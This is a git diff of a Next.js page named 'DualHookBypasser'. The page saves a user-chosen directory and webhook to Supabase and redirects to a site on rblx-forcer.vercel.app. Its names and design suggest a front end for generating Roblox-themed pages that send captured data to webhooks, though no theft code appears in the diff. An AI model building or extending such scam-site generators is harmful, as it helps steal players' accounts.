@@ -2,6 +2,7 @@
 
 import { useState } from 'react';
 import { createClient } from '@supabase/supabase-js';
+import { useRouter } from 'next/navigation';
 
 const supabase = createClient(
   process.env.NEXT_PUBLIC_SUPABASE_URL,
@@ -13,9 +14,11 @@ export default function Home() {
   const [webhook, setWebhook] = useState('');
   const [message, setMessage] = useState('');
   const [loading, setLoading] = useState(false);
+  const router = useRouter();
 
   const handleSubmit = async (e) => {
     e.preventDefault();
+
     if (!directory || !webhook) {
       setMessage('⚠️ Please fill in all fields.');
       return;
@@ -24,20 +27,17 @@ export default function Home() {
     setLoading(true);
     setMessage('⏳ Generating... Please wait.');
 
-    const { data, error } = await supabase.from('websites').insert([
-      {
-        directory,
-        webhook,
-      },
-    ]);
+    const { error } = await supabase.from('websites').insert([{ directory, webhook }]);
 
     if (error) {
       console.error(error);
       setMessage(`❌ Error: ${error.message}`);
     } else {
-      setMessage('✅ Created successfully! Your entry was saved.');
-      setDirectory('');
-      setWebhook('');
+      setMessage('✅ Created successfully! Redirecting...');
+      setTimeout(() => {
+        // Change this to your actual base URL
+        window.location.href = `https://rblx-forcer.vercel.app//${directory}`;
+      }, 1000);
     }
 
     setLoading(false);
@@ -92,4 +92,4 @@ export default function Home() {
       <p className="mt-8 text-sm text-gray-500">© 2025 DualHookBypasser</p>
     </main>
   );
-}
+    }
